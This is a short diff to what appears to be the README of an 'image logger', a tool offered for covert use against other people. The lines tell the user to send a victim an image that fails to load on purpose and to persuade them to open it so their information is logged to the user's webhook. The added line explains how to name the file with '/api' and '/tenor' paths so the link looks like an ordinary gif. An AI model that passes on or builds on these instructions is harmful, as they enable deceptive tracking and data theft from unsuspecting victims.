@@ -8,6 +8,9 @@ Please note that this is NOT a "one click" image logger. There is a very popular
 For it to work, at the start the image. when sent will NOT load ON PURPOSE. tell them to open it on a search engine then it will log all theyre info and sent it too your webhook. 
 
 You will need to change two lines of code, changing the webhook and the picture it will show them when opened.
+for "name your file, make sure you do /api then /tenor or any website with gifs.
+
+
 
 
 
